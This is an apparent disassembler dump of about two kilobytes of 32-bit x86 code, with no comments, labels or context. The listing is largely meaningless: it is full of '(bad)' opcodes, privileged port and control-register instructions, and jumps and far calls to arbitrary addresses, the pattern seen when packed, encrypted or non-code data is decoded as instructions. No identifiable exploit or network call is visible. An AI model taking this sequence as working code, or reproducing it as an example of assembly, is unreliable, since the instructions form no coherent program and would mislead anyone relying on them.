  4227ad:	and    eax,0x367dc4c8
  4227b2:	xor    ebp,DWORD PTR [esi+0x19]
  4227b5:	push   esi
  4227b6:	into   
  4227b7:	stos   BYTE PTR es:[edi],al
  4227b8:	ja     0x4227fb
  4227ba:	in     al,0x74
  4227bc:	adc    eax,0x75a9bcd2
  4227c1:	pop    esi
  4227c2:	adc    BYTE PTR [ecx-0x71],dl
  4227c5:	pop    edx
  4227c6:	xor    al,0xd3
  4227c8:	mov    dh,0xcc
  4227ca:	xor    esp,0xffffffcf
  4227cd:	imul   esp,DWORD PTR [esi+edx*2+0x71],0x4
  4227d2:	(bad)  
  4227d3:	adc    cl,BYTE PTR [edi+0x11f55da0]
  4227d9:	sbb    ch,BYTE PTR [ebp+ebp*2-0x36]
  4227dd:	mov    ss,WORD PTR [ecx]
  4227df:	lods   eax,DWORD PTR ds:[esi]
  4227e0:	cdq    
  4227e1:	cmp    edi,DWORD PTR [ebx-0x10]
  4227e4:	adc    al,0x16
  4227e6:	aaa    
  4227e7:	inc    ebx
  4227e8:	lods   eax,DWORD PTR ds:[esi]
  4227e9:	add    BYTE PTR [ecx],cl
  4227eb:	lea    ebx,[ebx+0x22]
	...
  4227fa:	dec    eax
  4227fb:	out    dx,eax
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx+0x584e210],ebx
  422808:	mov    ds:0x1a2c82f,al
  42280d:	add    ah,bh
  42280f:	add    DWORD PTR [eax],eax
  422811:	add    BYTE PTR [eax-0x54],dl
  422814:	jp     0x4227d5
  422816:	and    eax,0xb5f2541a
  42281b:	fisttp WORD PTR [eax+0x17]
  42281e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42281f:	push   eax
  422820:	sub    dl,BYTE PTR [edx+eax*1+0x6eef9553]
  422827:	xor    ah,BYTE PTR [edx+0xf]
  42282a:	mov    ds:0xafe130fd,al
  42282f:	rol    DWORD PTR [ebp+0x31],0x22
  422833:	mov    eax,ds:0x41c212f6
  422838:	int3   
  422839:	inc    edx
  42283a:	mov    dh,0x7f
  42283c:	add    al,0xd6
  42283e:	rcr    BYTE PTR [ebx-0x57c57c60],1
  422844:	push   eax
  422845:	retf   
  422846:	mov    ecx,0x12015717
  42284b:	lock lahf 
  42284d:	out    0x81,eax
  42284f:	adc    al,0x17
  422851:	dec    eax
  422852:	mov    bh,0xad
  422854:	mov    cl,0x30
  422856:	sar    BYTE PTR [edx-0x32],1
  422859:	leave  
  42285a:	ins    BYTE PTR es:[edi],dx
  42285b:	lds    ebx,FWORD PTR fs:[ebx+0x21709746]
  422862:	clc    
  422863:	inc    ebp
  422864:	jmp    0xdb76:0x9edf577e
  42286b:	or     DWORD PTR [ecx+0x40],edx
  42286e:	sbb    BYTE PTR [edi+0x1cf721b6],dl
  422874:	cmp    ebx,DWORD PTR [edi+0x132ab1ad]
  42287a:	cmp    al,0x8f
  42287c:	(bad)  
  42287d:	xlat   BYTE PTR ds:[ebx]
  42287e:	dec    edi
  42287f:	fmulp  st(2),st
  422881:	mov    al,0xd7
  422883:	arpl   WORD PTR [esi],bx
  422885:	iret   
  422886:	jmp    0x422838
  422888:	sbb    ch,BYTE PTR [ecx+esi*8+0x32]
  42288c:	sbb    dl,BYTE PTR [ebp+0x49]
  42288f:	fstp   TBYTE PTR [edi]
  422891:	call   0x785e74e3
  422896:	repz fdiv st(2),st
  422899:	ins    DWORD PTR es:[edi],dx
  42289a:	cli    
  42289b:	and    BYTE PTR [ebx+0x6e],0x57
  42289f:	jne    0x422880
  4228a1:	mov    ecx,0x43925f05
  4228a6:	aaa    
  4228a7:	cmp    DWORD PTR [di],ebx
  4228aa:	or     ch,al
  4228ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228ad:	cmp    al,0x17
  4228af:	lea    edi,[edx-0x32]
  4228b2:	cdq    
  4228b3:	mov    ebp,0xefdfedf2
  4228b8:	lds    eax,FWORD PTR [edi+0x59]
  4228bb:	push   0x39688674
  4228c0:	rcr    BYTE PTR [eax-0x33aa0d01],1
  4228c6:	sub    DWORD PTR [ebx],ecx
  4228c8:	pop    edi
  4228c9:	cmp    DWORD PTR [eax+0x3342d5ec],eax
  4228cf:	sahf   
  4228d0:	and    BYTE PTR [edi-0x34],0xc8
  4228d4:	xor    eax,DWORD PTR [ecx-0x4fcb5365]
  4228da:	in     eax,dx
  4228db:	mov    edi,0xee31b2f5
  4228e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228e1:	inc    ecx
  4228e2:	mov    al,0x7c
  4228e4:	(bad)  
  4228e5:	in     eax,0x57
  4228e7:	ror    DWORD PTR [ebx],0x4f
  4228ea:	imul   ecx,ebp,0xbf7e9cde
  4228f0:	test   eax,0xa3779b6d
  4228f5:	mov    BYTE PTR [edi+0x3a113093],bh
  4228fb:	ret    
  4228fc:	adc    DWORD PTR [ecx+ebp*4+0xc0252e4],0xab89c583
  422907:	cmp    DWORD PTR [ecx-0x2b36893a],esi
  42290d:	cdq    
  42290e:	fxch   st(5)
  422910:	push   ebx
  422911:	xor    BYTE PTR [edi+0x61],dh
  422914:	mov    esi,0x184ef98f
  422919:	out    dx,eax
  42291a:	or     al,0xfc
  42291c:	ret    
  42291d:	gs jge 0x422922
  422920:	loopne 0x4228be
  422922:	sbb    eax,0x953e41be
  422927:	jne    0x4228df
  422929:	cmc    
  42292a:	xchg   ecx,eax
  42292b:	add    al,0x7e
  42292d:	or     eax,0x8940ed3a
  422932:	jmp    0x42298d
  422934:	dec    edx
  422935:	repnz adc dh,BYTE PTR [ebp+ecx*1-0x23b35dda]
  42293d:	sar    DWORD PTR [esi-0x74],1
  422940:	outs   dx,DWORD PTR ds:[esi]
  422941:	and    ch,BYTE PTR [eax+edx*8-0x821d4ea]
  422948:	into   
  422949:	and    BYTE PTR [ebx+eiz*4+0x237efa54],0xb2
  422951:	xor    esp,DWORD PTR [ebx+0x35]
  422954:	inc    esi
  422955:	cs inc ebx
  422957:	sahf   
  422958:	inc    esp
  422959:	pusha  
  42295a:	fcom   DWORD PTR [esi]
  42295c:	aam    0xec
  42295e:	fsubr  DWORD PTR [esi-0xd]
  422961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422962:	aad    0xcc
  422964:	dec    ebp
  422965:	pop    ebx
  422966:	push   ebp
  422967:	mov    edi,0x39fc1496
  42296c:	mov    edi,0x28c3f55f
  422971:	inc    edi
  422972:	into   
  422973:	push   ecx
  422974:	pusha  
  422975:	out    dx,eax
  422976:	(bad)  
  422978:	mov    cr1,esp
  42297b:	mov    eax,ds:0xda1cc35a
  422980:	lock out 0x9e,al
  422983:	stos   BYTE PTR es:[edi],al
  422984:	mov    cs,ebp
  422986:	add    al,0x92
  422988:	inc    ecx
  422989:	(bad)  
  42298b:	icebp  
  42298c:	xor    cl,al
  42298e:	pop    esi
  42298f:	adc    dh,BYTE PTR [esi-0x64]
  422992:	jnp    0x422928
  422994:	jo     0x4229de
  422996:	and    BYTE PTR [ecx+ebp*4+0x3de8e161],ch
  42299d:	xchg   ebx,eax
  42299e:	in     al,0xb8
  4229a0:	or     eax,0x3cce7c94
  4229a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229a6:	aam    0xd7
  4229a8:	jmp    0x1821aa41
  4229ad:	mov    al,ds:0x87cf972f
  4229b2:	cmc    
  4229b3:	mov    bl,0x66
  4229b5:	nop
  4229b6:	in     al,dx
  4229b7:	xchg   edi,eax
  4229b8:	loope  0x4229b5
  4229ba:	shl    BYTE PTR [ebp-0x2c],cl
  4229bd:	pop    esp
  4229be:	inc    ecx
  4229bf:	dec    eax
  4229c0:	xor    al,0xf9
  4229c2:	pop    ss
  4229c3:	mov    ds:0x39f10785,al
  4229c8:	scas   eax,DWORD PTR es:[edi]
  4229c9:	add    al,0xe6
  4229cb:	sub    eax,0xd38a7e2c
  4229d0:	pop    ds
  4229d1:	xor    DWORD PTR [edi+esi*1+0x55],ebp
  4229d5:	adc    BYTE PTR [esi-0x66],0xb3
  4229d9:	mov    al,0x74
  4229db:	sbb    al,0x7b
  4229dd:	lea    edi,[esi+0x75]
  4229e0:	je     0x422a3c
  4229e2:	(bad)
  4229e5:	sbb    cl,BYTE PTR [eax-0xc]
  4229e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229e9:	cmp    esi,DWORD PTR [edx+0x7f]
  4229ec:	mov    al,ds:0x700bdd15
  4229f1:	call   0x4aeb114
  4229f6:	cmp    edx,DWORD PTR gs:[esi-0x31]
  4229fa:	or     eax,0x9b730169
  4229ff:	add    eax,0xa0b2e058
  422a04:	and    BYTE PTR [ebp+0x191e4ae1],ah
  422a0a:	jge    0x4229ab
  422a0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a0d:	outs   dx,DWORD PTR ds:[esi]
	...
  422a1a:	mov    al,0xe3
  422a1c:	pop    edx
  422a1d:	jecxz  0x422a7a
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	xchg   edi,eax
  422a27:	sbb    ebp,DWORD PTR [edx+0x1a4c47a]
  422a2d:	add    ah,bh
  422a2f:	add    DWORD PTR [eax],eax
  422a31:	add    BYTE PTR [esp+esi*4],ch
  422a34:	cmp    DWORD PTR [edx-0x7ce14249],0xffffffec
  422a3b:	or     esp,DWORD PTR [eax-0x5f258575]
  422a41:	cmp    al,0xcf
  422a43:	push   0x9f028aa7
  422a48:	cmp    al,0xd8
  422a4a:	shl    BYTE PTR [edi],0x50
  422a4d:	mov    ds:0x7022d768,al
  422a52:	fnstsw WORD PTR [edi+0x41761758]
  422a58:	arpl   WORD PTR [ebx-0x355d3ccc],sp
  422a5e:	push   ecx
  422a5f:	sbb    DWORD PTR [ebx+0x5da49bfe],0x15
  422a66:	fsubr  DWORD PTR [ebx+ebx*1+0x3ac8f6f4]
  422a6d:	popf   
  422a6e:	mul    esp
  422a70:	add    DWORD PTR [ebx],eax
  422a72:	mov    esp,0x12a72e6c
  422a77:	popf   
  422a78:	in     eax,dx
  422a79:	out    0xc8,eax
  422a7b:	push   0xe493c2ab
  422a80:	adc    al,0xb4
  422a82:	(bad)  
  422a83:	or     BYTE PTR [esi-0x16],ah
  422a86:	push   edi
  422a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a89:	and    ebx,DWORD PTR [edi+0x4bfb6da0]
  422a8f:	add    DWORD PTR [edx+edx*1],ebp
  422a92:	mov    ebx,0x9aadf5e
  422a97:	(bad)  
  422a98:	(bad)  
  422a99:	in     eax,0x13
  422a9b:	cmp    BYTE PTR [eax],ch
  422a9d:	push   0x779d88ae
  422aa2:	cdq    
  422aa3:	inc    eax
  422aa4:	mov    ah,0xf1
  422aa6:	sub    ecx,edi
  422aa8:	mov    bl,0xdf
  422aaa:	in     eax,dx
  422aab:	add    DWORD PTR [edi-0x140cfc7f],0x6c
  422ab2:	dec    ebp
  422ab3:	xchg   ebx,eax
  422ab4:	mov    esi,0x623d90a9
  422ab9:	lock xchg edx,eax
  422abb:	mov    esi,0x741b8701
  422ac0:	add    al,0xdc
  422ac2:	adc    bl,0xc1
  422ac5:	retf   0x15b6
  422ac8:	in     al,0xad
  422aca:	sbb    BYTE PTR [ecx+0x39667c5f],al
  422ad0:	gs jb  0x422ab7
  422ad3:	in     eax,dx
  422ad4:	push   0xffffffc5
  422ad6:	inc    ebp
  422ad7:	popf   
  422ad8:	inc    esi
  422ad9:	adc    DWORD PTR [ebx-0x63],eax
  422adc:	adc    DWORD PTR [esp+ebx*2],0x63
  422ae0:	es push esi
  422ae2:	in     al,0xcf
  422ae4:	mov    esi,0x6675fbaf
  422ae9:	popf   
  422aea:	push   0xd27d6b70
  422aef:	pop    esp
  422af0:	dec    edx
  422af1:	jp     0x422b0a
  422af3:	jge    0x422af2
  422af5:	cli    
  422af6:	retf   0x478e
  422af9:	push   es
  422afa:	loop   0x422b25
  422afc:	fiadd  WORD PTR [ecx+0x6245fb41]
  422b02:	ficomp DWORD PTR [esi]
  422b04:	add    dl,BYTE PTR [esi-0xea67f14]
  422b0a:	xchg   ecx,eax
  422b0b:	(bad)  
  422b0c:	lds    esi,FWORD PTR [edi+ebx*2]
  422b0f:	jne    0x422ae8
  422b11:	sub    esi,DWORD PTR [ecx]
  422b13:	aaa    
  422b14:	iret   
  422b15:	sub    bl,bh
  422b17:	scas   eax,DWORD PTR es:[edi]
  422b18:	fnstenv [esi+0x5d]
  422b1b:	and    DWORD PTR [eax+0x71],ecx
  422b1e:	or     eax,DWORD PTR [ebx]
  422b20:	test   eax,0xc5afc89b
  422b25:	mov    fs,WORD PTR [ecx-0x42501c72]
  422b2b:	mov    WORD PTR [edx+0x487a4ea8],es
  422b31:	mov    ah,0xa
  422b33:	jns    0x422b61
  422b35:	mov    eax,ds:0xed4c50e0
  422b3a:	sub    ebp,DWORD PTR [esi]
  422b3c:	xchg   esp,eax
  422b3d:	inc    edx
  422b3e:	xchg   esp,eax
  422b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b40:	mov    DWORD PTR [ecx+0x3edee81],eax
  422b46:	iret   
  422b47:	mov    bh,0x7e
  422b49:	push   ecx
  422b4a:	ins    BYTE PTR es:[edi],dx
  422b4b:	mov    ds:0x82cb4951,eax
  422b50:	cs dec eax
  422b52:	xchg   edx,eax
  422b53:	pusha  
  422b54:	pop    edx
  422b55:	loop   0x422b66
  422b57:	mov    ecx,DWORD PTR [ebp-0x3fbaf22d]
  422b5d:	iret   
  422b5e:	scas   al,BYTE PTR es:[edi]
  422b5f:	sub    dl,BYTE PTR [edx]
  422b61:	or     al,0xfc
  422b63:	lock adc bl,dh
  422b66:	(bad)  
  422b67:	xlat   BYTE PTR ds:[ebx]
  422b68:	mov    eax,DWORD PTR [ebx]
  422b6a:	pop    ebx
  422b6b:	push   edi
  422b6c:	fbstp  TBYTE PTR [ecx+0x47]
  422b6f:	add    BYTE PTR [eax],ch
  422b71:	rcl    DWORD PTR ds:0x736339d5,cl
  422b77:	or     DWORD PTR [ecx-0x6],esp
  422b7a:	cld    
  422b7b:	add    BYTE PTR [esp+edi*2-0x6a],al
  422b7f:	pushf  
  422b80:	dec    ebp
  422b81:	(bad)  
  422b82:	es (bad) 
  422b84:	and    BYTE PTR [esp+ebx*2],dl
  422b87:	ret    0x10c3
  422b8a:	int    0xd1
  422b8c:	add    BYTE PTR [eax-0x5977890d],dl
  422b92:	jne    0x422bd0
  422b94:	cdq    
  422b95:	jo     0x422b53
  422b97:	fdiv   DWORD PTR [edx]
  422b99:	or     eax,0xbd07d277
  422b9e:	sub    eax,0x52ccd4fd
  422ba3:	sbb    eax,0xbc28301e
  422ba8:	fadd   st,st(0)
  422baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bab:	jbe    0x422bb0
  422bad:	mov    fs,WORD PTR [ebx-0x161f9a8e]
  422bb3:	cmc    
  422bb4:	(bad)  
  422bb6:	(bad)  
  422bb7:	dec    esi
  422bb8:	test   BYTE PTR [esp+eax*4+0x662f8087],0x20
  422bc0:	shl    edi,1
  422bc2:	pop    eax
  422bc3:	mov    edx,0xeeaf999e
  422bc8:	push   0xb8718d47
  422bcd:	add    edx,DWORD PTR [edi]
  422bcf:	mov    edx,0x2a574456
  422bd4:	jmp    0xd4f1:0xdf66d496
  422bdb:	ret    0xbd24
  422bde:	in     al,0xb9
  422be0:	vpaddd ymm2,ymm2,YMMWORD PTR [ebx-0x34]
  422be5:	mov    dl,0xf8
  422be7:	daa    
  422be8:	aas    
  422be9:	aad    0x7e
  422beb:	stc    
  422bec:	push   eax
  422bed:	adc    cl,BYTE PTR [eax]
  422bef:	stos   BYTE PTR es:[edi],al
  422bf0:	pop    ebp
  422bf1:	sub    BYTE PTR [esi+eiz*4+0x7d9c902a],0x28
  422bf9:	pushf  
  422bfa:	inc    esi
  422bfb:	mov    al,0x6f
  422bfd:	out    dx,al
  422bfe:	aam    0x6f
  422c00:	addr16 mov ds:0xdd1e,al
  422c04:	(bad)  
  422c05:	in     al,dx
  422c06:	rcr    di,cl
  422c09:	out    dx,al
  422c0a:	cmp    BYTE PTR [esi-0x5e3f4dfd],ah
  422c10:	pop    ss
  422c11:	cmovp  ebp,DWORD PTR [esi+0x4]
  422c15:	mov    eax,ds:0xb6d296d6
  422c1a:	sub    esi,DWORD PTR [eax+0x22541427]
  422c20:	out    0xdd,eax
  422c22:	pop    es
  422c23:	cmp    BYTE PTR [esp+eax*2-0x73],bl
  422c27:	clc    
  422c28:	mov    eax,0xe25f0e9b
  422c2d:	jo     0x422c2f
	...
  422c37:	add    BYTE PTR [eax],al
  422c39:	add    BYTE PTR ds:0xbf06168e,dh
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    esp,DWORD PTR [eax-0x3f2d8ccb]
  422c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4c:	add    DWORD PTR [eax],eax
  422c4e:	cld    
  422c4f:	add    DWORD PTR [eax],eax
  422c51:	add    BYTE PTR [ebx-0x40],ch
  422c54:	inc    ebp
  422c55:	retf   0x2101
  422c58:	iret   
  422c59:	in     eax,0xb3
  422c5b:	inc    ebx
  422c5c:	push   ebp
  422c5d:	imul   edx,esi,0xfffffffa
  422c60:	add    eax,0x6b1d3635
  422c65:	mov    cl,0xf0
  422c67:	sbb    al,0x6e
  422c69:	lods   eax,DWORD PTR ds:[esi]
  422c6a:	pop    ds
  422c6b:	pusha  
  422c6c:	pushf  
  422c6d:	sbb    ebx,DWORD PTR [eax+0x4ace4026]
  422c73:	and    al,0x2c
  422c75:	adc    eax,0x1d2fb6a7
  422c7a:	push   0x1b
  422c7c:	mov    ecx,0x95e942f8
  422c81:	xchg   esp,eax
  422c82:	xchg   esp,eax
  422c83:	fmulp  st(3),st
  422c85:	cmp    eax,0xce21c4a6
  422c8a:	adc    bl,bl
  422c8c:	ret    0x1114
  422c8f:	mov    ebp,0x1da4b492
  422c94:	xor    al,BYTE PTR [ebp+0x4b]
  422c97:	and    esi,DWORD PTR [ebp+0x27]
  422c9a:	jno    0x422c5e
  422c9c:	ja     0x422c63
  422c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c9f:	cli    
  422ca0:	por    mm3,QWORD PTR [edx-0x3c]
  422ca4:	out    dx,al
  422ca5:	sbb    al,BYTE PTR [ecx-0x30]
  422ca8:	int    0x72
  422caa:	and    al,cl
  422cac:	ins    BYTE PTR es:[edi],dx
  422cad:	daa    
  422cae:	sti    
  422caf:	jecxz  0x422c34
  422cb1:	scas   al,BYTE PTR es:[edi]
  422cb2:	shr    dh,0x4b
  422cb5:	das    
  422cb6:	(bad)  
  422cb7:	loopne 0x422d20
  422cb9:	inc    ebp
  422cba:	sub    cl,BYTE PTR [ebx+ebx*8+0x37]
  422cbe:	dec    ebp
  422cbf:	sbb    DWORD PTR [esi+edx*8],0xffffffa1
  422cc3:	or     BYTE PTR [eax+0x296a259],cl
  422cc9:	fisubr DWORD PTR [ebp-0x1db086e2]
  422ccf:	xchg   ecx,eax
  422cd0:	jmp    0xf1abb64c
  422cd5:	inc    esi
  422cd6:	push   edx
  422cd7:	sbb    eax,0x59bfb68b
  422cdc:	inc    ecx
  422cdd:	inc    ebx
  422cde:	xor    al,cl
  422ce0:	xchg   edx,eax
  422ce1:	mov    WORD PTR ds:0x32f59fe3,es
  422ce7:	or     bl,BYTE PTR ds:0x86953c7e
  422ced:	stos   DWORD PTR es:[edi],eax
  422cee:	mov    esi,0x60c86d39
  422cf3:	(bad)  
  422cf4:	ret    
  422cf5:	rcr    bl,1
  422cf7:	push   ds
  422cf8:	inc    edi
  422cf9:	fsubr  QWORD PTR [esp+ecx*8-0x2c]
  422cfd:	xchg   edi,eax
  422cfe:	add    ecx,0xff54757
  422d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d05:	jmp    0x565a:0xb1baaf98
  422d0c:	and    BYTE PTR [esi+eax*2-0x3546a3c],dl
  422d13:	jo     0x422d4f
  422d15:	cmp    al,0x87
  422d17:	mov    al,0x9a
  422d19:	sahf   
  422d1a:	xlat   BYTE PTR ds:[ebx]
  422d1b:	push   ebp
  422d1c:	xchg   ebx,eax
  422d1d:	pushf  
  422d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d1f:	pop    ebx
  422d20:	(bad)  
  422d21:	cmc    
  422d22:	sub    al,0xf9
  422d24:	fninit 
  422d26:	test   al,0xa3
  422d28:	dec    ecx
  422d29:	or     edi,DWORD PTR [edx+0x2ff23896]
  422d2f:	mov    esi,0xdc7bbd4f
  422d34:	pop    esi
  422d35:	leave  
  422d36:	icebp  
  422d37:	retf   0x740f
  422d3a:	mov    ch,0x98
  422d3c:	dec    ebp
  422d3d:	mov    dh,0x82
  422d3f:	stos   DWORD PTR es:[edi],eax
  422d40:	mov    edx,0xc03d2986
  422d45:	xchg   esi,eax
  422d46:	loope  0x422ce3
  422d48:	pop    ebx
  422d49:	mov    WORD PTR [esi*8-0x3e3e9d1c],cs
  422d50:	lods   al,BYTE PTR ds:[esi]
  422d51:	push   es
  422d52:	scas   eax,DWORD PTR es:[edi]
  422d53:	scas   eax,DWORD PTR es:[edi]
  422d54:	ss loope 0x422d51
  422d57:	out    0xd6,al
  422d59:	sbb    ebp,DWORD PTR [edi]
  422d5b:	and    cl,BYTE PTR [edi-0x4d50b3d2]
  422d61:	or     eax,DWORD PTR [ebx+0x3a]
  422d64:	bound  ebx,QWORD PTR [esi-0x66d92139]
  422d6a:	mov    dh,0xd6
  422d6c:	jne    0x422d6b
  422d6e:	mov    ecx,0xd4f598cd
  422d73:	hlt    
  422d74:	add    DWORD PTR [eax-0x2d],0x4f
  422d78:	ins    DWORD PTR es:[edi],dx
  422d79:	out    dx,al
  422d7a:	mov    bh,0x92
  422d7c:	pop    edi
  422d7d:	mov    cl,0x19
  422d7f:	aam    0x99
  422d81:	cmp    ecx,DWORD PTR [ebx-0x18]
  422d84:	popf   
  422d85:	cmp    DWORD PTR [esi-0x5b52ec26],edx
  422d8b:	in     al,0x97
  422d8d:	or     al,0xa2
  422d8f:	sbb    BYTE PTR [edx-0x2e],0xea
  422d93:	mov    bl,bh
  422d95:	mov    ah,BYTE PTR [ecx-0x58]
  422d98:	aas    
  422d99:	push   esp
  422d9a:	adc    BYTE PTR [edx-0x69dd6ba5],dl
  422da0:	mov    eax,0xdadb3f3
  422da5:	add    ebp,DWORD PTR [eax-0x30]
  422da8:	js     0x422db7
  422daa:	in     eax,0xa6
  422dac:	inc    eax
  422dad:	and    BYTE PTR [ebx+0x14],0x33
  422db1:	push   es
  422db2:	dec    ecx
  422db3:	test   DWORD PTR [ebx-0x70a761c6],esi
  422db9:	cmp    al,0xea
  422dbb:	(bad)  
  422dbc:	in     eax,dx
  422dbd:	pusha  
  422dbe:	jno    0x422d98
  422dc0:	inc    ebp
  422dc1:	lahf   
  422dc2:	push   0xd316cf4c
  422dc7:	xchg   BYTE PTR [ebx+0x6aca074d],dh
  422dcd:	add    BYTE PTR cs:[edi-0x22],cl
  422dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422dd2:	pushf  
  422dd3:	pop    edx
  422dd4:	mov    ds:0xb501fb2d,eax
  422dd9:	push   ebp
  422dda:	adc    BYTE PTR [edx-0x12],bh
  422ddd:	pushf  
  422dde:	push   0x51af9c
  422de3:	jge    0x422e63
  422de5:	sbb    eax,0x690cbcd7
  422dea:	dec    edi
  422deb:	mov    eax,ds:0xc6167d4
  422df0:	cmc    
  422df1:	jb     0x422df9
  422df3:	mov    edi,0x2b6406d4
  422df8:	cdq    
  422df9:	mov    ah,0x97
  422dfb:	js     0x422e58
  422dfd:	addr16 je 0x422dca
  422e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e01:	adc    edx,DWORD PTR [ecx-0x4f]
  422e04:	mov    eax,ds:0xcb3ededc
  422e09:	mov    al,0x4e
  422e0b:	shl    BYTE PTR [ebx+0x395beced],cl
  422e11:	pop    es
  422e12:	loope  0x422db8
  422e14:	adc    ebx,ebp
  422e16:	ss pop ecx
  422e18:	aad    0x50
  422e1a:	(bad)  
  422e1c:	enter  0x6c77,0xe
  422e20:	inc    ebp
  422e21:	pop    ebx
  422e22:	js     0x422e81
  422e24:	es (bad) 
  422e26:	cmp    dl,al
  422e28:	mov    edx,0x6743eecb
  422e2d:	jbe    0x422e66
  422e2f:	push   0x3d
  422e31:	push   es
  422e32:	dec    ebp
  422e33:	scas   al,BYTE PTR es:[edi]
  422e34:	add    BYTE PTR [ebp+0x54134734],ah
  422e3a:	mov    esp,0x8d10794e
  422e3f:	adc    al,0x6a
  422e41:	pop    esi
  422e42:	out    0xae,al
  422e44:	leave  
  422e45:	mov    esp,0xfac6dbf0
  422e4a:	xlat   BYTE PTR ds:[ebx]
  422e4b:	and    dl,BYTE PTR [edi+ecx*2]
	...
  422e5a:	stc    
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi+0x1e41fec4]
  422e68:	jne    0x422eb9
  422e6a:	mov    esp,0xfc0001a8
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    BYTE PTR [esi],bh
  422e73:	fdivrp st(5),st
  422e75:	xchg   esi,eax
  422e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e77:	adc    BYTE PTR [esi-0x162aeab9],cl
  422e7d:	test   al,0xf1
  422e7f:	push   ss
  422e80:	rol    BYTE PTR [ebx-0x3d21744f],1
  422e86:	pop    esp
  422e87:	retf   0xf3be
  422e8a:	popa   
  422e8b:	fiadd  DWORD PTR [edi-0x78]
  422e8e:	push   ecx
  422e8f:	xor    bh,dh
  422e91:	jecxz  0x422e63
  422e93:	fldcw  WORD PTR [esi]
  422e95:	adc    eax,0x2f013aa0
  422e9a:	int3   
  422e9b:	xor    BYTE PTR [edi-0x50],0x57
  422e9f:	and    eax,0x6292c7c
  422ea4:	cmp    DWORD PTR [edi],ecx
  422ea6:	in     al,0x2d
  422ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ea9:	mov    eax,ds:0x9659fb51
  422eae:	mul    dh
  422eb0:	mov    ah,0x2d
  422eb2:	mov    eax,ds:0x9115cd5f
  422eb7:	int3   
  422eb8:	push   ss
  422eb9:	aam    0xe4
  422ebb:	out    0xec,eax
  422ebd:	xchg   edx,eax
  422ebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ebf:	ror    DWORD PTR ds:[edi],1
  422ec2:	retf   
  422ec3:	outs   dx,BYTE PTR ds:[esi]
  422ec4:	pop    ss
  422ec5:	mov    gs,WORD PTR [esi+eax*2]
  422ec8:	xor    DWORD PTR [edi+edx*8],0xe97c4b1d
  422ecf:	mov    cl,0xa8
  422ed1:	fwait
  422ed2:	daa    
  422ed3:	or     dl,BYTE PTR [eax+0x518c91c2]
  422ed9:	mov    cl,0xfd
  422edb:	push   ss
  422edc:	popf   
  422edd:	mov    edi,DWORD PTR [edi]
  422edf:	mov    ebx,0x5fd7d6da
  422ee4:	or     al,0x17
  422ee6:	loopne 0x422edf
  422ee8:	jo     0x422f3e
  422eea:	in     eax,0x33
  422eec:	push   cs
  422eed:	fwait
  422eee:	(bad)  
  422eef:	xchg   ebx,eax
  422ef0:	lock pop eax
  422ef2:	std    
  422ef3:	lahf   
  422ef4:	cmp    ch,BYTE PTR [esi+0x4b353344]
  422efa:	popf   
  422efb:	ret    
  422efc:	daa    
  422efd:	mov    cl,0xeb
  422eff:	in     al,0x6d
  422f01:	int    0xfe
  422f03:	xchg   ebp,eax
  422f04:	ret    0xb08d
  422f07:	pop    edi
  422f08:	sbb    al,0x41
  422f0a:	dec    ebx
  422f0b:	and    eax,0x7990c38b
  422f10:	rcl    BYTE PTR [esi],cl
  422f12:	(bad)
  422f15:	mov    eax,ds:0xb1655a47
  422f1a:	jo     0x422f82
  422f1c:	inc    ebx
  422f1d:	lock neg BYTE PTR [edi-0xd6347e2]
  422f24:	xor    ch,BYTE PTR [edx+0x47]
  422f27:	inc    edi
  422f28:	push   eax
  422f29:	pop    ebp
  422f2a:	jmp    0x422eaf
  422f2c:	das    
  422f2d:	daa    
  422f2e:	call   0x816b5808
  422f33:	dec    esi
  422f34:	inc    ebp
  422f35:	xchg   ebp,eax
  422f36:	sti    
  422f37:	and    ecx,eax
  422f39:	int3   
  422f3a:	sbb    ch,BYTE PTR [edx+0x1]
  422f3d:	or     BYTE PTR [ebx],ch
  422f3f:	adc    DWORD PTR [edi],edx
  422f41:	loope  0x422fbf
  422f43:	mov    bh,0xc3
  422f45:	bound  edi,QWORD PTR [eax-0x59]
  422f48:	pop    ebp
  422f49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f4a:	sbb    al,0xf4
  422f4c:	lahf   
  422f4d:	mov    edx,0x9c95b9ad
  422f52:	aad    0x1d
  422f54:	jb     0x422f07
  422f56:	mov    ds:0x251bb45a,al
  422f5b:	test   DWORD PTR [ebx+0x3d],esp
  422f5e:	int    0x5f
  422f60:	loop   0x422fd0
  422f62:	jl     0x422ee4
  422f64:	repz (bad) 
  422f66:	mov    esi,0x45328fe7
  422f6b:	dec    ebx
  422f6c:	mov    ecx,0x1a7d7588
  422f71:	jns    0x422f86
  422f73:	fistp  WORD PTR [ebx+0x5d]
  422f76:	(bad)  
  422f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
